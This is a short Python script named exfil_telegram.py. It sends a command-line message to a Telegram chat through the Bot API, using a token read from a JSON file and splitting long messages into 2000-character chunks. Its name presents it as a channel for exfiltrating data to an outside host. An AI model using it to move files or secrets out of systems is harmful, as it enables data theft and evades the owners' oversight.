import http.client
import json
import sys

if len(sys.argv) < 2:
    print("Usage: python3 exfil_telegram.py <message>")
    sys.exit(1)

MESSAGE = str(sys.argv[1])

with open("telegram-data.json", "r") as file:
    data = json.load(file)

BOT_TOKEN = data["BOT_TOKEN"]
CHAT_ID = data["CHAT_ID"]


def sendData(data):
    conn = http.client.HTTPSConnection("api.telegram.org")
    payload = {"chat_id": CHAT_ID, "text": data}
    headers = {"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"}
    conn.request(
        "POST",
        "/bot" + BOT_TOKEN + "/sendMessage",
        body=json.dumps(payload),
        headers=headers,
    )
    response = conn.getresponse()
    print(response.status, response.reason)
    print(response.read().decode())


if len(MESSAGE) < 2000:
    sendData(MESSAGE)
else:
    for i in range(0, len(MESSAGE), 2000):
        sendData(MESSAGE[i : i + 2000])
